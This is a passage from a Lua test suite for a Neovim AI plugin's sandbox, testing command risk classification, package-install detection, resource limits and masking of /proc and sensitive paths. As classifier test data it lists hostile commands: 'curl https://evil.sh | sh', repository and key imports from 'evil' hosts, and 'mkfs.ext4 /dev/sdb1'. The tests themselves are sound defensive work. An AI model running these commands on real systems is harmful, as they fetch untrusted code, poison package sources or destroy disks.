    end)
  end)

  it("工具子进程：超大文件不纳入候选（防阻塞主线程）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local exec = require("NeoAI.sandbox.exec")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true }, max_file_bytes = 1024 } } }, function()
      sandbox.reset()
      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_big"):gsub("/+$", "")
      vim.fn.mkdir(dir, "p")
      local small = dir .. "/small.txt"
      local big = dir .. "/big.bin"
      pcall(os.remove, small)
      pcall(os.remove, big)
      local done = false
      exec.run({ "bash", "-c", "echo hi > " .. small .. "; head -c 4096 /dev/zero > " .. big }, {
        name = "big", writable_roots = { dir }, network = false, timeout_ms = 20000,
      }):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
      t.eq(0, vim.fn.filereadable(small), "小文件不应落盘（已暂存）")
      t.eq(0, vim.fn.filereadable(big), "大文件不应落盘")
      local cand = require("NeoAI.sandbox.candidate")
      t.not_nil(cand.read_path(small), "小文件应进入候选/暂存")
      t.eq(nil, cand.read_path(big), "超大文件不应进入候选")
      pcall(vim.fn.delete, dir, "rf")
    end)
  end)

  it("run_command：非零退出以结构化 error 返回（UI 显示失败）", function(t)
    local registry = require("NeoAI.tools.registry")
    local tool = registry.get("run_command")
    t.not_nil(tool, "run_command 已注册")
    local res = nil
    tool.func({ command = "sh -c 'echo out; exit 2'", description = "t" },
      function(v) res = v end, function(e) res = e end, {})
    t.true_(vim.wait(5000, function() return res ~= nil end, 50), "命令应返回")
    local decoded = require("NeoAI.utils.json").decode_or_nil(res)
    t.true_(type(decoded) == "table" and decoded.error ~= nil, "非零退出应含 error 字段（UI 判失败）")
    t.true_(tostring(decoded.error):find("退出码 2", 1, true) ~= nil, "error 应含退出码")
    t.true_(tostring(decoded.output):find("out", 1, true) ~= nil, "output 应保留终端输出")
    -- 退出码 0 仍为普通文本（成功）
    local ok_res = nil
    tool.func({ command = "echo fine", description = "t" },
      function(v) ok_res = v end, function(e) ok_res = e end, {})
    t.true_(vim.wait(5000, function() return ok_res ~= nil end, 50), "命令应返回")
    t.eq(nil, require("NeoAI.utils.json").decode_or_nil(ok_res), "成功应为普通文本")
  end)

  it("沙箱内 sudo/doas 被剥离（已是 root）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({
      tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } },
    }, function()
      sandbox.reset()
      local done, out = false, nil
      require("NeoAI.tools").execute("run_command", { command = "sudo sh -c 'echo SUDO_STRIPPED_OK'", description = "t" }, {})
        :then_(function(r) out = tostring(r); done = true end, function(e) out = tostring(e); done = true end)
      t.true_(vim.wait(12000, function() return done end), "命令应完成")
      t.true_(out:find("SUDO_STRIPPED_OK", 1, true) ~= nil, "sudo 应被剥离并正常执行，实际: " .. tostring(out))
      t.true_(out:find("sudo:", 1, true) == nil, "不应出现 sudo 报错")
    end)
  end)

  it("包管理器识别：扩展名单与路径特征，改动封顶 L2", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    for _, cmd in ipairs({ "npx create-react-app x", "uv pip install requests",
      "conda install numpy", "cargo install ripgrep", "npm i lodash" }) do
      local r = privilege.classify("run_command", { command = cmd }, { effect = "process" })
      t.true_(r.package, "应识别为包安装: " .. cmd)
    end
    t.eq("npm", privilege.package_path_manager("/x/node_modules/express/index.js"), "node_modules → npm")
    t.eq("pip", privilege.package_path_manager("/usr/lib/python3/dist-packages/requests/x.py"), "dist-packages → pip")
    t.eq("apt", privilege.package_path_manager("/var/lib/apt/lists/x"), "apt lists → apt")
    t.eq("cargo", privilege.package_path_manager("/root/.cargo/registry/x"), "cargo registry → cargo")
    t.eq("conda", privilege.package_path_manager("/opt/conda/pkgs/x"), "conda pkgs → conda")
    t.eq(nil, privilege.package_path_manager("/root/project/src/main.lua"), "普通文件不误判")
    local risk = require("NeoAI.sandbox.risk")
    local r = risk.classify({ package = true, paths = { "/root/.cargo/registry/x" }, secret = true })
    t.eq(1, r.level, "安全包安装封顶中危（L1）")
    local rs = risk.classify({ package = true, package_sensitive = true, paths = { "/var/lib/apt/lists/x" } })
    t.eq(2, rs.level, "敏感包安装（改动软件源/密钥）保留 L2")
  end)

  it("包管理器识别：跳过 sudo/env/bash -c/for…do 包装器，避免漏判升 L3", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local risk = require("NeoAI.sandbox.risk")
    local wrapped = {
      "sudo apt-get install -y curl",
      "cd /tmp && sudo apt-get install -y curl",
      "env sudo apt-get install -y curl",
      "bash -c 'apt-get install -y curl'",
      "for p in a b; do apt-get install -y $p; done",
      "sh -c \"pip install requests\"",
    }
    for _, cmd in ipairs(wrapped) do
      local req = privilege.classify("run_command", { command = cmd }, { effect = "process" })
      t.true_(req.package, "包装器命令应识别为包安装: " .. cmd)
      local r = risk.classify({
        package = req.package, paths = { "/var/lib/apt/lists/x" }, secret = true,
        privilege_tier = req.tier, network = req.network, command = cmd,
      })
      t.eq(1, r.level, "安全包安装封顶中危（L1），不因密钥误报升 L3: " .. cmd)
    end
    -- 非包管理器命令不应误判（首个真实命令不是包管理器）
    t.false_(privilege.classify("run_command", { command = "echo npm" }, { effect = "process" }).package,
      "echo npm 不应识别为包安装")
    -- package_info 同样跳过包装器提取管理器与包名
    local info = privilege.package_info("sudo apt-get install -y curl")
    t.eq("apt-get", info and info.manager, "应提取管理器")
    t.eq("apt-get:curl", info and info.key, "应提取包名合并键")
  end)

  it("风险分级：包安装不因工作区外/密钥误报升到 L3", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local r = risk.classify({
      package = true, paths = { "/var/lib/apt/lists/x" }, secret = true,
      network = true, privilege_tier = 1,
    })
    t.eq(1, r.level, "安全包安装应封顶中危（L1）")
    local rs = risk.classify({
      package = true, package_sensitive = true, paths = { "/var/lib/apt/lists/x" },
    })
    t.eq(2, rs.level, "敏感包安装（改动第三方软件源/密钥）保留 L2")
    t.eq(3, risk.dangerous_level("mkfs.ext4 /dev/sdb1"), "设备级破坏命令应为 L3")
    local r2 = risk.classify({ package = true, command = "mkfs.ext4 /dev/sdb1", paths = { "/var/lib/apt/lists/x" } })
    t.eq(3, r2.level, "破坏性包命令仍应 L3")
  end)

  it("资源限制：默认按宿主动态推导（CPU/内存/PID），静态值优先", function(t)
    local cgroup = require("NeoAI.sandbox.cgroup")
    t.true_(cgroup.limits_configured(), "默认应启用资源限制")
    local l = cgroup.resolve_limits()
    t.true_(l.memory_bytes > 0, "应推导内存上限")
    t.true_(l.pids > 0, "应推导 PID 上限")
    t.true_(l.cpu_max > 0, "应推导 CPU 配额")
    with_config({ tools = { sandbox = { limits = { cpu_max = 12345, memory_bytes = 111, pids = 7 } } } }, function()
      local s = cgroup.resolve_limits()
      t.eq(12345, s.cpu_max, "静态 CPU 优先")
      t.eq(111, s.memory_bytes, "静态内存优先")
      t.eq(7, s.pids, "静态 PID 优先")
    end)
    with_config({ tools = { sandbox = { limits = { dynamic = false } } } }, function()
      t.true_(not cgroup.limits_configured(), "dynamic=false 且无静态限制时不应启用")
    end)
  end)

  it("资源限制：全局 CPU 预算封顶并发总量，单任务配额不超预算", function(t)
    local cgroup = require("NeoAI.sandbox.cgroup")
    local ok, cpus = pcall(vim.uv.cpus)
    local n = (ok and type(cpus) == "table" and #cpus > 0) and #cpus
      or tonumber(((vim.fn.system("nproc 2>/dev/null") or ""):gsub("%s+$", ""))) or 1
    t.eq(math.max(1, n - 1), cgroup.global_cpu_max(), "默认全局预算应为 核数-1（留 1 核给 nvim）")
    with_config({ tools = { sandbox = { limits = { cpu_global_max = 2 } } } }, function()
      t.eq(2, cgroup.global_cpu_max(), "静态全局预算优先")
      t.eq(200000, cgroup.effective_cpu_max(8 * 100000), "单任务配额应被全局预算封顶")
      t.eq(100000, cgroup.effective_cpu_max(100000), "低于预算的单任务配额保持")
      t.eq(0, cgroup.effective_cpu_max(0), "0 表示不限制")
    end)
  end)

  it("包安装：提取管理器与包名（按安装命令合并）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local info = privilege.package_info("npm install express lodash")
    t.not_nil(info, "应识别 npm 安装")
    t.eq("npm", info.manager, "管理器")
    t.eq("npm:express,lodash", info.key, "合并键")
    local pip = privilege.package_info("pip3 install --user requests flask")
    t.not_nil(pip, "应识别 pip 安装")
    t.eq("pip3", pip.manager, "管理器")
    t.eq("pip3:requests,flask", pip.key, "应跳过 flag 提取包名")
    local ci = privilege.package_info("npm ci")
    t.not_nil(ci, "应识别无包名的安装")
    t.eq("npm:*", ci.key, "无显式包名时用通配键")
    t.eq(nil, privilege.package_info("echo hello"), "非包安装返回 nil")
  end)

  it("包安装：敏感安装判定（改动第三方软件源/密钥）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    -- 普通安装：安全
    for _, cmd in ipairs({ "apt-get install -y curl", "pip install requests", "npm install express",
      "cargo install ripgrep", "sudo apt-get update" }) do
      t.false_(privilege.package_sensitive(cmd), "普通安装不应视为敏感: " .. cmd)
    end
    -- 改动第三方软件源 / 密钥：敏感
    for _, cmd in ipairs({
      "add-apt-repository ppa:foo/bar",
      "apt-key add key.gpg",
      "echo 'deb http://evil/x' > /etc/apt/sources.list.d/evil.list",
      "dnf config-manager --add-repo https://evil/repo",
      "rpm --import https://evil/key.asc",
      "pip install --index-url https://evil/simple foo",
      "npm install --registry https://evil foo",
      "gem sources --add https://evil",
      "gpg --import evil.key",
      "brew tap evil/foo",
    }) do
      t.true_(privilege.package_sensitive(cmd), "应视为敏感安装: " .. cmd)
    end
    t.false_(privilege.package_sensitive("echo hello"), "非包命令不敏感")
    t.false_(privilege.package_sensitive(nil), "nil 不敏感")
  end)

  it("包安装：含包管理器的命令加回窄 capability（含链式）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local r = privilege.resolve(1, { tier = 1, package = true, package_all = true })
    t.true_(r.ok, "应解析成功")
    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_DAC_OVERRIDE"), "应加回 DAC_OVERRIDE")
    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_CHOWN"), "应加回 CHOWN")
    t.true_(not vim.tbl_contains(r.privileges.cap_add, "CAP_MKNOD"), "默认不应含 CAP_MKNOD（seccomp 另行硬拦设备节点）")
    -- 链式命令（含非包管理器段）同样加回：apt 需 CHOWN/SETUID 才能 chown/setuid 到 _apt；
    -- 写入仍全部进 overlay 暂存、敏感路径由遮蔽挂载保护，不扩大宿主面。
    local r2 = privilege.resolve(1, { tier = 1, package = true, package_all = false })
    t.true_(vim.tbl_contains(r2.privileges.cap_add, "CAP_DAC_OVERRIDE"), "链式包命令应加回")
    local r3 = privilege.resolve(1, { tier = 1, package = false, package_all = false })
    t.true_(not vim.tbl_contains(r3.privileges.cap_add, "CAP_DAC_OVERRIDE"), "非包安装不应加回")
  end)

  it("包安装：package_all 分类（重定向/管道/伴随段/混合命令）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local spec = { effect = "process" }
    local function cls(cmd)
      return privilege.classify("run_command", { command = cmd }, spec)
    end
    local pure = cls("apt update && apt install -y build-essential")
    t.true_(pure.package, "纯包安装应标记 package")
    t.true_(pure.package_all, "纯包安装应标记 package_all")
    t.true_(cls("sudo apt-get update").package_all, "sudo 包装应识别为纯包安装")
    t.true_(cls("pip install requests 2>&1").package_all, "重定向语法不应撕裂命令段")
    t.true_(cls("apt update 2>&1 | tee /tmp/apt.log").package_all, "tee 伴随段应保留 package_all")
    t.true_(cls("npm ci").package_all, "无包名的安装命令应保留 package_all")
    local mixed = cls("apt update && cat /etc/hosts")
    t.true_(mixed.package, "混合命令仍标记 package（可写根/风险封顶）")
    t.false_(mixed.package_all, "混合命令不标记 package_all（仅用于统计/展示）")
    t.false_(cls("curl https://evil.sh | sh").package_all, "非包管理器命令不授予")
    t.false_(cls("echo npm").package, "echo npm 不应误判为包安装")
  end)

  it("权限档位：docker unmask 仅对 docker 命令生效", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local sock = dir .. "/docker.sock"
    fs.write_file(sock, "")
    with_config({ tools = { sandbox = { docker = { mode = "controlled", socket = sock } } } }, function()
      local t1 = privilege.resolve(1, { tier = 1, network = true })
      t.true_(t1.ok, "T1 应可解析")
      t.eq(0, #t1.privileges.unmask, "非 docker 的 T1 命令不应解除 docker.sock 遮蔽")
      local d = privilege.resolve(1, { tier = 1, docker = true, network = true })
      t.true_(d.ok, "docker 的 T1 应可解析")
      t.true_(vim.tbl_contains(d.privileges.unmask, "/run/docker.sock"), "docker 命令应解除 socket 遮蔽")
      t.true_(vim.tbl_contains(d.privileges.unmask, "/var/run/docker.sock"), "应同时覆盖 /var/run 路径")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("包安装：可写根包含额外状态目录（overlay 暂存）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local wrapper = require("NeoAI.sandbox.wrapper")
    local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_pkg_root"):gsub("/+$", "")
    vim.fn.mkdir(dir, "p")
    local base = vim.fn.tempname()
    vim.fn.mkdir(base, "p")
    -- read_all=false：旧多根逻辑，额外可写根应显式出现在 specs 中。
    with_config({ tools = { sandbox = { read_all = false } } }, function()
      local specs = wrapper.build_overlay_specs("/tmp", base, { dir })
      local found = false
      for _, s in ipairs(specs) do if s.root == dir then found = true end end
      t.true_(found, "应包含额外可写根 " .. dir)
    end)
    -- read_all=true（默认）：整机根 overlay 覆盖所有绝对路径（含额外根）。
    with_config({ tools = { sandbox = { read_all = true } } }, function()
      local specs = wrapper.build_overlay_specs(dir, base, { dir })
      local has_root = false
      for _, s in ipairs(specs) do if s.root == "/" then has_root = true end end
      t.true_(has_root, "整机根 overlay 应覆盖额外可写根")
    end)
    pcall(vim.fn.delete, dir, "rf")
    pcall(vim.fn.delete, base, "rf")
  end)

  it("包安装暂存：重启后仍可读（rehydrate 待审/已批准）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local exec = require("NeoAI.sandbox.exec")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_persist"):gsub("/+$", "")
      vim.fn.mkdir(dir, "p")
      local real_file = dir .. "/node_modules/pkg/index.js"
      vim.fn.mkdir(vim.fn.fnamemodify(real_file, ":h"), "p")
      pcall(os.remove, real_file)
      local done = false
      exec.run({ "bash", "-c", "echo PKG > " .. real_file }, {
        name = "pkg", writable_roots = { dir }, network = false, timeout_ms = 20000,
      }):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
      -- 模拟重启：shutdown 清空暂存目录，init 从持久化候选重建。
      sandbox.shutdown()
      sandbox.init()
      local staged = require("NeoAI.sandbox.candidate").read_path(real_file)
      t.not_nil(staged, "重启后应能从候选重建暂存副本")
      local f = io.open(staged)
      local content = f and f:read("*a") or ""
      if f then f:close() end
      t.matches("PKG", content, "重启后暂存内容应保留")
      pcall(vim.fn.delete, dir, "rf")
    end)
  end)

  it("工具子进程：共享目录位于沙箱存储之外（不被强制遮蔽）", function(t)
    local exec = require("NeoAI.sandbox.exec")
    local store = require("NeoAI.sandbox.store")
    local sr = exec.shared_root()
    local root = (store.root() or ""):gsub("/+$", "")
    t.true_(root ~= "" and sr ~= root and sr:sub(1, #root + 1) ~= root .. "/",
      "共享目录不应位于沙箱存储内")
  end)

  it("加固：隐藏 /proc/cmdline 与 /proc/version", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(prefix) do cmd[#cmd + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c",
      "echo \"cmdline=[$(cat /proc/cmdline)]\"; echo \"version=[$(cat /proc/version)]\"",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("cmdline=%[%]", 1) ~= nil, "cmdline 应为空，实际: " .. tostring(out))
    t.true_(out:find("version=%[%]", 1) ~= nil, "version 应为空，实际: " .. tostring(out))
    t.true_(out:find("BOOT_IMAGE", 1, true) == nil, "不应泄露宿主内核命令行")
  end)

  it("加固：强制遮蔽危险全局 sysctl（core_pattern/modprobe），用户不可移除", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local masks = runtime.mandatory_proc_masks()
    t.true_(vim.tbl_contains(masks, "/proc/sys/kernel/core_pattern"), "应含 core_pattern")
    t.true_(vim.tbl_contains(masks, "/proc/sys/kernel/modprobe"), "应含 modprobe")
    t.true_(vim.tbl_contains(masks, "/proc/sysrq-trigger"), "应含 sysrq-trigger")
    t.true_(vim.tbl_contains(masks, "/proc/kcore"), "应含 kcore")
    t.true_(vim.tbl_contains(masks, "/proc/vmallocinfo"), "应含 vmallocinfo")
    t.true_(vim.tbl_contains(masks, "/proc/keys"), "应含 keys")
    -- 用户把 hide_proc_paths 设为空表，强制项仍在
    with_config({ tools = { sandbox = { hide_proc_paths = {} } } }, function()
      local paths = runtime.proc_mask_paths()
      t.true_(vim.tbl_contains(paths, "/proc/sys/kernel/core_pattern"), "空配置下仍应含 core_pattern")
      t.true_(vim.tbl_contains(paths, "/proc/sys/kernel/modprobe"), "空配置下仍应含 modprobe")
      local joined = table.concat(runtime.append_hidden_proc({}), " ")
      t.true_(joined:find("/proc/sys/kernel/core_pattern", 1, true) ~= nil, "argv 应遮蔽 core_pattern")
      t.true_(joined:find("/proc/sys/kernel/modprobe", 1, true) ~= nil, "argv 应遮蔽 modprobe")
    end)
    -- 整个 /proc/sys 只读绑定应出现在 bwrap 前缀中
    if runtime.backend() == "bwrap" then
      local pre = table.concat(runtime.process_prefix({ cwd = "/tmp" }), " ")
      t.true_(pre:find("--ro-bind /proc/sys /proc/sys", 1, true) ~= nil, "前缀应只读绑定 /proc/sys")
    end
  end)

  it("加固：沙箱内无法写 core_pattern（只读遮蔽 → EROFS）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(prefix) do cmd[#cmd + 1] = v end
    -- `: > file` 只做 open(O_WRONLY) 不写内容：可写则无副作用，只读则 EROFS。
    -- 放进子 shell 重定向，避免 dash 因重定向失败而终止整条命令。
    for _, v in ipairs({ "/bin/sh", "-c",
      "if ( : > /proc/sys/kernel/core_pattern ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/kernel/modprobe ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/kernel/randomize_va_space ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/net/ipv4/ip_forward ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/vm/swappiness ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("WRITABLE", 1, true) == nil, "全局 sysctl 不应可写，实际: " .. tostring(out))
    t.true_(out:find("READONLY", 1, true) ~= nil, "应为只读（EROFS），实际: " .. tostring(out))
    -- 只读绑定不应破坏读取
    local cmd2 = {}
    for _, v in ipairs(prefix) do cmd2[#cmd2 + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c", "cat /proc/sys/kernel/randomize_va_space" }) do cmd2[#cmd2 + 1] = v end
    local out2 = vim.fn.system(cmd2)
    t.matches("%d", out2, "只读后仍应能读取 sysctl，实际: " .. tostring(out2))
  end)

  it("加固：/etc/resolv.conf 净化暴露（剥离 search/domain）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(prefix) do cmd[#cmd + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c",
      "if grep -Eq '^(search|domain)[[:space:]]' /etc/resolv.conf 2>/dev/null; then echo LEAK_SEARCH; fi; "
      .. "if grep -q '^nameserver' /etc/resolv.conf 2>/dev/null; then echo HAS_NS; fi; echo DONE",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("LEAK_SEARCH", 1, true) == nil, "不应泄露 search/domain，实际: " .. tostring(out))
    local host_has_ns = false
    local hf = io.open("/etc/resolv.conf", "r")
    if hf then
      local c = hf:read("*a")
      hf:close()
      host_has_ns = c:find("nameserver", 1, true) ~= nil
    end
    if host_has_ns then
      t.true_(out:find("HAS_NS", 1, true) ~= nil, "应保留 nameserver 行，实际: " .. tostring(out))
    end
    t.true_(out:find("DONE", 1, true) ~= nil, "命令应完成")
  end)

  it("加固：resolv_conf 可配 hide / passthrough", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    with_config({ tools = { sandbox = { resolv_conf = "hide" } } }, function()
      local joined = table.concat(runtime.append_readonly({}), " ")
      t.true_(joined:find("/etc/resolv.conf", 1, true) == nil, "hide 时不应暴露 resolv.conf")
    end)
    if vim.uv.fs_stat("/etc/resolv.conf") then
      with_config({ tools = { sandbox = { resolv_conf = "passthrough" } } }, function()
        local joined = table.concat(runtime.append_readonly({}), " ")
        t.true_(joined:find("--ro-bind /etc/resolv.conf /etc/resolv.conf", 1, true) ~= nil,
          "passthrough 应原样暴露 resolv.conf")
      end)
    end
  end)

  it("加固：/tmp、/var/tmp 为每会话私有 tmpfs（不暴露宿主残留）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local residue = "/tmp/neoai_residue_probe.txt"
    fs.write_file(residue, "HOST_RESIDUE\n")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "cat /tmp/neoai_residue_probe.txt 2>/dev/null && echo LEAK_RESIDUE || echo NO_RESIDUE; "
          .. "stat -c '%a' /tmp; stat -c '%a' /var/tmp 2>/dev/null || echo NO_VARTMP",
        description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(s:find("LEAK_RESIDUE", 1, true) == nil, "沙箱 /tmp 不应看到宿主残留，实际: " .. s)
        t.matches("NO_RESIDUE", s, "宿主残留应不可见")
        t.matches("1777", s, "/tmp 应为 1777")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    pcall(fs.delete_file, residue)
    vim.fn.delete(dir, "rf")
  end)

  it("加固：遮蔽目录（其他一级条目/隐藏文件）且 cwd 子树豁免", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local home = "/root/neoai_home_mask_test"
    local proj = home .. "/proj"
    fs.ensure_dir(proj)
    fs.ensure_dir(home .. "/other")
    fs.write_file(home .. "/secret.txt", "s")
    fs.write_file(home .. "/.bash_history", "h")
    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = true, mask_dirs = { "/home", "/root" } } } }, function()
      local prefix = runtime.process_prefix({ cwd = proj })
      t.not_nil(prefix, "应能构造前缀")
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--ro-bind /root /root", 1, true) ~= nil, "cwd 所在作用域应只读暴露")
      t.true_(joined:find("--tmpfs " .. home .. "/other", 1, true) ~= nil, "作用域下其他目录应遮蔽")
      t.true_(joined:find("--bind /dev/null " .. home .. "/.bash_history", 1, true) ~= nil, "隐藏文件应遮蔽")
      t.true_(joined:find("--tmpfs " .. proj, 1, true) == nil, "cwd 子树不应被遮蔽")
      -- 遮蔽条目查询（供审批）：命中兄弟目录，cwd 子树与祖先链不命中
      t.eq(home .. "/other", runtime.mask_entry(home .. "/other/x.txt", proj), "应返回遮蔽条目")
      t.nil_(runtime.mask_entry(proj .. "/a.txt", proj), "cwd 子树不应命中")
      t.nil_(runtime.mask_entry(home, proj), "祖先链不应命中")
      -- 审批放行：unmask 该条目后不再遮蔽（含后代）
      local unmasked = table.concat(runtime.process_prefix({
        cwd = proj, privileges = { tier = 0, unmask = { home .. "/other" } },
      }), " ")
      t.true_(unmasked:find("--tmpfs " .. home .. "/other", 1, true) == nil, "获批条目应解除遮蔽")
    end)
    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = false } } }, function()
      local joined = table.concat(runtime.process_prefix({ cwd = proj }), " ")
      t.true_(joined:find("--ro-bind /root /root", 1, true) == nil, "关闭后不应额外暴露 home")
      t.true_(joined:find("--tmpfs " .. home .. "/other", 1, true) == nil, "关闭后不应遮蔽 home")
    end)
    vim.fn.delete(home, "rf")
  end)

  it("加固：遮蔽目录命中走审批，批准放行、无界面 fail-closed", function(t)
    local fs = require("NeoAI.utils.fs")
    local home = "/root/neoai_mask_approve_test"
    local proj = home .. "/proj"
    local secret = home .. "/other/secret.txt"
    fs.ensure_dir(proj)
    fs.ensure_dir(home .. "/other")
    fs.write_file(secret, "TOPSECRET")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(proj)
    with_config({ tools = { sandbox = {
      read_all = false, mask_dirs_enabled = true, mask_dirs = { "/root" }, mask_dirs_approval = true,
    } } }, function()
      -- 1) 有审批界面：弹窗（stub）批准后放行读取
      local asked = nil
      local stub = {
        approve_and_execute = function(name, _args, _ctx, continue_fn)
          asked = name
          return continue_fn()
        end,
      }
      local done, result = false, nil
      require("NeoAI.tools").execute("read_file", { filepath = secret, description = "t" }, { tool_service = stub })
        :then_(function(r)
          result = tostring(r)
          done = true
        end, function(e)
          result = "ERR:" .. tostring(e and e.message or e)
          done = true
        end)
      t.true_(vim.wait(10000, function() return done end), "应完成")
      t.eq("read_file", asked, "应触发审批弹窗")
      t.matches("TOPSECRET", result or "", "批准后应可读取")
      -- 2) 无审批界面：进程内读取 fail-closed 拒绝
      local done2, err2 = false, nil
      require("NeoAI.tools").execute("read_file", { filepath = secret, description = "t" }, {})
        :then_(function(r)
          err2 = "OK:" .. tostring(r)
          done2 = true
        end, function(e)
          err2 = "ERR:" .. tostring(e and e.message or e)
          done2 = true
        end)
      t.true_(vim.wait(10000, function() return done2 end), "应完成")
      t.matches("ERR:", err2 or "", "无界面应拒绝，实际: " .. tostring(err2))
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(home, "rf")
  end)

  it("加固：进程内工具硬拦截宿主敏感遮蔽路径（mask_paths）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local file = dir .. "/secret.env"
    fs.write_file(file, "TOPSECRET")
    with_config({ tools = { sandbox = { mask_paths = { file, dir } } } }, function()
      -- 查询 API：目录/文件/后代命中，普通路径不命中
      t.eq(dir, runtime.is_masked_path(dir), "目录本身应命中")
      t.eq(dir, runtime.is_masked_path(dir .. "/sub/x"), "目录后代应命中")
      t.eq(file, runtime.is_masked_path(file), "文件本身应命中")
      t.nil_(runtime.is_masked_path("/tmp/neoai_not_masked"), "普通路径不应命中")
      -- 进程内 read_file 命中即硬拒绝（即便有审批界面也不放行）
      local stub = { approve_and_execute = function(_, _, _, cont) return cont() end }
      local done, err = false, nil
      require("NeoAI.tools").execute("read_file", { filepath = file, description = "t" }, { tool_service = stub })
        :then_(function(r)
          err = "OK:" .. tostring(r)
          done = true
        end, function(e)
          err = "ERR:" .. tostring(e and e.message or e)
          done = true
        end)
      t.true_(vim.wait(5000, function() return done end), "应快速返回")
      t.matches("宿主敏感遮蔽路径", err or "", "应硬拒绝，实际: " .. tostring(err))
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("加固：遮蔽路径解析符号链接与 /proc/<pid>/root，防进程内绕过", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local file = dir .. "/secret.env"
    fs.write_file(file, "TOPSECRET")
    local link_dir = vim.fn.tempname()
    fs.ensure_dir(link_dir)
    local link = link_dir .. "/link.env"
    vim.uv.fs_symlink(file, link)
    -- 悬空符号链接：目标尚未创建，但指向被遮蔽目录（写入也会落到宿主敏感路径）
    local dangling = link_dir .. "/dangling.env"
    vim.uv.fs_symlink(dir .. "/new-secret.env", dangling)
    with_config({ tools = { sandbox = { mask_paths = { file, dir } } } }, function()
      t.eq(file, runtime.is_masked_path(file), "原路径应命中")
      t.eq(file, runtime.is_masked_path(link), "符号链接应解析到遮蔽文件")
      t.eq(dir, runtime.is_masked_path(dangling), "悬空符号链接应解析到遮蔽目录")
